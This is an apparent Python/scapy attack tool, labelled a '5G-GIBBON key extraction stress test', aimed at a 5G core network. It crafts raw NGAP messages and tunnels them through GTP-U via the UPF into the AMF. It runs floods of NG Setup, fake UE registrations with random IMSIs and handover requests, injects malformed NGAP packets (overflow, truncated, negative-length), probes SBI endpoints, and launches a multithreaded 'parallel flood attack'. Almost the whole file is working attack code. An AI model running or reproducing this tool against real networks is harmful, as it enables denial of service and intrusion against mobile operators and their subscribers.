#!/usr/bin/env python3
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.sctp import SCTP
from scapy.packet import Raw
from scapy.sendrecv import send, sr1
from scapy.contrib.gtp import GTPHeader
import logging
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from core.config import DETECTED_COMPONENTS
 
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

NGAP_PORT = 38412
SBI_PORT = 7777
GTP_PORT = 2152
PFCP_PORT = 8805

def craft_ng_setup_request(gnb_id=None):
    if gnb_id is None:
        gnb_id = random.randint(1, 0xFFFFFF)
    
    ng_setup = bytes([
        0x00, 0x15,
        0x00, 0x2F,
        0x00, 0x00, 0x04,
        0x00, 0x1B, 0x00, 0x08, 0x00,
        (gnb_id >> 16) & 0xFF, (gnb_id >> 8) & 0xFF, gnb_id & 0xFF,
        0x00, 0x00, 0xF1, 0x10,
        0x00, 0x66, 0x00, 0x0D, 0x00,
        0x00, 0x00, 0x00, 0x01,
        0x00, 0xF1, 0x10, 0x00, 0x00, 0x00, 0x08,
        0x00, 0x15, 0x40, 0x01, 0x60,
        0x00, 0x52, 0x40, 0x06, 0x01, 0x80,
        0x52, 0x6F, 0x67, 0x75, 0x65,
    ])
    return ng_setup

def craft_initial_ue_message(imsi=None):
    if imsi is None:
        imsi = f"00101{random.randint(1000000000, 9999999999)}"
    
    initial_ue = bytes([
        0x00, 0x0F,
        0x40, 0x3E,
        0x00, 0x00, 0x05,
        0x00, 0x55, 0x00, 0x02, 0x00, 0x01,
        0x00, 0x26, 0x00, 0x1A, 0x19,
        0x7E, 0x00, 0x41, 0x79, 0x00, 0x0D, 0x01,
        0x00, 0xF1, 0x10,
    ] + [int(d) for d in imsi[:10]] + [
        0x00, 0x00, 0x00, 0x00,
        0x2E, 0x04, 0x80, 0xE0, 0x80, 0xE0,
        0x00, 0x79, 0x00, 0x0F, 0x40,
        0x00, 0xF1, 0x10, 0x00, 0x00, 0x00,
        0x00, 0x10, 0x00, 0xF1, 0x10, 0x00, 0x00, 0x01,
        0x00, 0x5A, 0x40, 0x01, 0x18,
    ])
    return initial_ue

def craft_handover_required():
    handover = bytes([
        0x00, 0x00,
        0x40, 0x30,
        0x00, 0x00, 0x06,
        0x00, 0x55, 0x00, 0x02, 0x00, 0x01,
        0x00, 0x1A, 0x00, 0x03, 0x00, 0x00, 0x01,
        0x00, 0x04, 0x00, 0x03, 0x00, 0x00, 0x00,
        0x00, 0x66, 0x00, 0x0D, 0x00,
        0x00, 0x00, 0x00, 0x01, 0x00, 0xF1, 0x10,
        0x00, 0x00, 0x00, 0x08,
        0x00, 0x02, 0x40, 0x02, 0x00, 0x00,
        0x00, 0x01, 0x40, 0x02, 0x00, 0x00,
    ])
    return handover

def craft_ue_context_release():
    release = bytes([
        0x00, 0x29,
        0x00, 0x10,
        0x00, 0x00, 0x02,
        0x00, 0x55, 0x00, 0x02, 0x00, 0x01,
        0x00, 0x0F, 0x40, 0x01, 0x00,
    ])
    return release

def craft_nas_security_mode_complete():
    nas_smc = bytes([
        0x7E, 0x00,
        0x5E,
        0x00,
        0x00, 0x00, 0x00, 0x00,
    ])
    return nas_smc

def craft_malformed_ngap(attack_type="overflow"):
    if attack_type == "overflow":
        return bytes([0x00, 0x15, 0xFF, 0xFF]) + b'\x41' * 65535
    elif attack_type == "null":
        return bytes([0x00, 0x00, 0x00, 0x00])
    elif attack_type == "invalid_procedure":
        return bytes([0xFF, 0xFF, 0x00, 0x10]) + b'\x00' * 16
    elif attack_type == "truncated":
        return bytes([0x00, 0x15, 0x00, 0x50])
    elif attack_type == "negative_length":
        return bytes([0x00, 0x15, 0x80, 0x00, 0x00, 0x01])
    else:
        return bytes([0x00] * 100)

def tunnel_to_amf(upf_ip, amf_ip, payload, teid=12345):
    outer = IP(src="10.0.0.8", dst=upf_ip) / UDP(sport=GTP_PORT, dport=GTP_PORT)
    outer = outer / GTPHeader(teid=teid, gtp_type=255)
    inner = IP(src="10.0.0.8", dst=amf_ip) / UDP(sport=NGAP_PORT, dport=NGAP_PORT) / Raw(load=payload)
    return outer / Raw(load=bytes(inner))

def direct_sctp_to_amf(amf_ip, payload):
    pkt = IP(dst=amf_ip) / SCTP(sport=NGAP_PORT, dport=NGAP_PORT) / Raw(load=payload)
    return pkt

def direct_tcp_to_sbi(target_ip, payload, port=SBI_PORT):
    pkt = IP(dst=target_ip) / TCP(sport=random.randint(40000, 60000), dport=port, flags="PA") / Raw(load=payload)
    return pkt

def stress_test_ng_setup(amf_ip, upf_ip, count=100, method="tunnel", analyze_responses=True):
    logger.info(f"=== NG Setup Flood ({count} requests via {method}) ===")
    results = {
        "sent": 0, 
        "responses": 0, 
        "errors": 0,
        "response_types": {},
        "avg_response_time": 0
    }
    response_times = []
    
    for i in range(count):
        try:
            gnb_id = random.randint(1, 0xFFFFFF)
            ng_setup = craft_ng_setup_request(gnb_id)
            
            if method == "tunnel":
                pkt = tunnel_to_amf(upf_ip, amf_ip, ng_setup, teid=random.randint(1, 65535))
            elif method == "direct_sctp":
                pkt = direct_sctp_to_amf(amf_ip, ng_setup)
            elif method == "direct_udp":
                pkt = IP(dst=amf_ip) / UDP(sport=NGAP_PORT, dport=NGAP_PORT) / Raw(load=ng_setup)
            else:
                pkt = tunnel_to_amf(upf_ip, amf_ip, ng_setup, teid=random.randint(1, 65535))
            
            if analyze_responses:
                start = time.time()
                resp = sr1(pkt, timeout=0.1, verbose=0)
                elapsed = (time.time() - start) * 1000
                
                results["sent"] += 1
                
                if resp:
                    results["responses"] += 1
                    response_times.append(elapsed)
                    
                    if resp.haslayer(Raw):
                        raw_data = bytes(resp[Raw])
                        if len(raw_data) > 0:
                            resp_type = raw_data[0]
                            results["response_types"][resp_type] = results["response_types"].get(resp_type, 0) + 1
            else:
                send(pkt, verbose=0)
                results["sent"] += 1
            
            if i % 10 == 0:
                resp_rate = (results["responses"] / results["sent"] * 100) if results["sent"] > 0 else 0
                logger.info(f"  Sent {i}/{count} (gNB: {gnb_id:06X}) - {resp_rate:.1f}% responses")
        except Exception as e:
            results["errors"] += 1
            logger.debug(f"Error: {e}")
    
    if response_times:
        results["avg_response_time"] = sum(response_times) / len(response_times)
    
    resp_rate = (results["responses"] / results["sent"] * 100) if results["sent"] > 0 else 0
    logger.info(f"✓ Flood complete: {results['sent']} sent, {results['responses']} responses ({resp_rate:.1f}%)")
    logger.info(f"  Avg response time: {results['avg_response_time']:.1f}ms")
    if results["response_types"]:
        logger.info(f"  Response types: {results['response_types']}")
    return results

def stress_test_initial_ue(amf_ip, upf_ip, count=50, analyze_responses=True):
    logger.info(f"=== Initial UE Message Flood ({count} fake UEs) ===")
    results = {"sent": 0, "responses": 0, "auth_challenges": 0, "rejects": 0}
    
    for i in range(count):
        try:
            imsi = f"00101{random.randint(1000000000, 9999999999)}"
            initial_ue = craft_initial_ue_message(imsi)
            pkt = tunnel_to_amf(upf_ip, amf_ip, initial_ue, teid=random.randint(1, 65535))
            
            if analyze_responses:
                resp = sr1(pkt, timeout=0.2, verbose=0)
                results["sent"] += 1
                
                if resp:
                    results["responses"] += 1
                    if resp.haslayer(Raw):
                        raw_data = bytes(resp[Raw])
                        if len(raw_data) > 2:
                            msg_type = raw_data[1] if len(raw_data) > 1 else 0
                            if msg_type == 0x56:
                                results["auth_challenges"] += 1
                            elif msg_type == 0x44:
                                results["rejects"] += 1
            else:
                send(pkt, verbose=0)
                results["sent"] += 1
            
            if i % 10 == 0:
                resp_rate = (results["responses"] / results["sent"] * 100) if results["sent"] > 0 else 0
                logger.info(f"  Sent {i}/{count} (IMSI: {imsi}) - {resp_rate:.1f}% responses")
        except Exception as e:
            logger.debug(f"Error: {e}")
    
    resp_rate = (results["responses"] / results["sent"] * 100) if results["sent"] > 0 else 0
    logger.info(f"✓ UE flood complete: {results['sent']} sent, {results['responses']} responses ({resp_rate:.1f}%)")
    logger.info(f"  Auth challenges: {results['auth_challenges']}, Rejects: {results['rejects']}")
    return results

def stress_test_handover(amf_ip, upf_ip, count=50):
    logger.info(f"=== Handover Request Flood ({count} requests) ===")
    results = {"sent": 0}
    
    for _ in range(count):
        try:
            handover = craft_handover_required()
            pkt = tunnel_to_amf(upf_ip, amf_ip, handover, teid=random.randint(1, 65535))
            send(pkt, verbose=0)
            results["sent"] += 1
        except Exception as e:
            logger.debug(f"Error: {e}")
    
    logger.info(f"✓ Handover flood complete: {results['sent']} requests sent")
    return results

def stress_test_malformed(amf_ip, upf_ip, count=20):
    logger.info(f"=== Malformed NGAP Injection ({count} per type) ===")
    attack_types = ["overflow", "null", "invalid_procedure", "truncated", "negative_length"]
    results = {"sent": 0, "by_type": {}}
    
    for attack_type in attack_types:
        results["by_type"][attack_type] = 0
        logger.info(f"  Testing: {attack_type}")
        
        for _ in range(count):
            try:
                malformed = craft_malformed_ngap(attack_type)
                pkt = tunnel_to_amf(upf_ip, amf_ip, malformed, teid=random.randint(1, 65535))
                send(pkt, verbose=0)
                results["sent"] += 1
                results["by_type"][attack_type] += 1
            except Exception as e:
                logger.debug(f"Error: {e}")
    
    logger.info(f"✓ Malformed injection complete: {results['sent']} packets")
    return results

def stress_test_sbi(target_ips, count=50):
    logger.info(f"=== SBI/HTTP2 Probe ({count} per target) ===")
    results = {"sent": 0, "targets": []}
    
    payloads = [
        b'GET /nnrf-nfm/v1/nf-instances HTTP/2\r\n\r\n',
        b'POST /nudm-uecm/v1/imsi-001010000000001/registrations/amf-3gpp-access HTTP/2\r\n\r\n',
        b'GET /nausf-auth/v1/ue-authentications HTTP/2\r\n\r\n',
        b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n',
        b'\x00\x00\x00\x04\x01\x00\x00\x00\x00',
    ]
    
    for target_ip in target_ips:
        logger.info(f"  Probing {target_ip}:7777")
        for _ in range(count):
            try:
                payload = random.choice(payloads)
                pkt = direct_tcp_to_sbi(target_ip, payload)
                send(pkt, verbose=0)
                results["sent"] += 1
            except Exception as e:
                logger.debug(f"Error: {e}")
        results["targets"].append(target_ip)
    
    logger.info(f"✓ SBI probe complete: {results['sent']} packets to {len(results['targets'])} targets")
    return results

def parallel_flood(amf_ip, upf_ip, threads=10, packets_per_thread=50):
    logger.info(f"=== PARALLEL FLOOD ({threads} threads × {packets_per_thread} packets) ===")
    total_sent = 0
    
    def flood_worker(worker_id):
        sent = 0
        for _ in range(packets_per_thread):
            try:
                gnb_id = random.randint(1, 0xFFFFFF)
                ng_setup = craft_ng_setup_request(gnb_id)
                pkt = tunnel_to_amf(upf_ip, amf_ip, ng_setup, teid=random.randint(1, 65535))
                send(pkt, verbose=0)
                sent += 1
            except:
                pass
        return sent
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(flood_worker, i) for i in range(threads)]
        for future in as_completed(futures):
            total_sent += future.result()
    
    logger.info(f"✓ Parallel flood complete: {total_sent} packets sent")
    return total_sent

def monitor_for_responses(duration=30):
    logger.info(f"=== Monitoring for responses ({duration}s) ===")
    from scapy.all import sniff
    
    responses = []
    
    def handle_pkt(pkt):
        if pkt.haslayer(Raw):
            payload = bytes(pkt[Raw])
            if len(payload) > 4:
                responses.append({
                    "src": pkt[IP].src if pkt.haslayer(IP) else "unknown",
                    "payload_preview": payload[:50].hex(),
                    "length": len(payload)
                })
                logger.info(f"  ✓ RESPONSE from {pkt[IP].src if pkt.haslayer(IP) else 'unknown'}: {len(payload)} bytes")
    
    sniff(filter="udp port 38412 or sctp port 38412 or tcp port 7777", 
          prn=handle_pkt, timeout=duration, store=0)
    
    logger.info(f"✓ Captured {len(responses)} responses")
    return responses

def run_full_stress_test(amf_ip=None, upf_ip=None):
    if amf_ip is None:
        amf_ip = DETECTED_COMPONENTS.get("amf_ip", "127.0.0.5")
    if upf_ip is None:
        upf_ip = DETECTED_COMPONENTS.get("upf_ip", "127.0.0.7")
    
    logger.info("=" * 60)
    logger.info("5G-GIBBON KEY EXTRACTION STRESS TEST")
    logger.info("=" * 60)
    logger.info(f"Target AMF: {amf_ip}")
    logger.info(f"Target UPF: {upf_ip}")
    logger.info("")
    
    all_results = {}
    
    logger.info("\n[PHASE 1] NG Setup Flood via GTP Tunnel")
    all_results["ng_setup_tunnel"] = stress_test_ng_setup(amf_ip, upf_ip, count=100, method="tunnel")
    time.sleep(1)
    
    logger.info("\n[PHASE 2] NG Setup Flood - Direct SCTP")
    all_results["ng_setup_sctp"] = stress_test_ng_setup(amf_ip, upf_ip, count=50, method="direct_sctp")
    time.sleep(1)
    
    logger.info("\n[PHASE 3] NG Setup Flood - Direct UDP")
    all_results["ng_setup_udp"] = stress_test_ng_setup(amf_ip, upf_ip, count=50, method="direct_udp")
    time.sleep(1)
    
    logger.info("\n[PHASE 4] Fake UE Registration Flood")
    all_results["initial_ue"] = stress_test_initial_ue(amf_ip, upf_ip, count=50)
    time.sleep(1)
    
    logger.info("\n[PHASE 5] Handover Request Flood")
    all_results["handover"] = stress_test_handover(amf_ip, upf_ip, count=50)
    time.sleep(1)
    
    logger.info("\n[PHASE 6] Malformed NGAP Injection")
    all_results["malformed"] = stress_test_malformed(amf_ip, upf_ip, count=20)
    time.sleep(1)
    
    logger.info("\n[PHASE 7] SBI/HTTP2 Probing")
    sbi_targets = ["127.0.0.5", "127.0.0.4", "127.0.0.10", "127.0.0.11", "127.0.0.12"]
    all_results["sbi"] = stress_test_sbi(sbi_targets, count=20)
    time.sleep(1)
    
    logger.info("\n[PHASE 8] Parallel Flood Attack")
    all_results["parallel"] = parallel_flood(amf_ip, upf_ip, threads=10, packets_per_thread=50)
    
    logger.info("\n" + "=" * 60)
    logger.info("STRESS TEST COMPLETE")
    logger.info("=" * 60)
    
    total_packets = sum([
        all_results["ng_setup_tunnel"]["sent"],
        all_results["ng_setup_sctp"]["sent"],
        all_results["ng_setup_udp"]["sent"],
        all_results["initial_ue"]["sent"],
        all_results["handover"]["sent"],
        all_results["malformed"]["sent"],
        all_results["sbi"]["sent"],
        all_results["parallel"],
    ])
    
    logger.info(f"\nTOTAL PACKETS SENT: {total_packets}")
    logger.info("\nAttack Summary:")
    logger.info(f"  • NG Setup (tunnel):  {all_results['ng_setup_tunnel']['sent']}")
    logger.info(f"  • NG Setup (SCTP):    {all_results['ng_setup_sctp']['sent']}")
    logger.info(f"  • NG Setup (UDP):     {all_results['ng_setup_udp']['sent']}")
    logger.info(f"  • Fake UE Messages:   {all_results['initial_ue']['sent']}")
    logger.info(f"  • Handover Requests:  {all_results['handover']['sent']}")
    logger.info(f"  • Malformed NGAP:     {all_results['malformed']['sent']}")
    logger.info(f"  • SBI Probes:         {all_results['sbi']['sent']}")
    logger.info(f"  • Parallel Flood:     {all_results['parallel']}")
    
    return all_results

if __name__ == "__main__":
    run_full_stress_test()

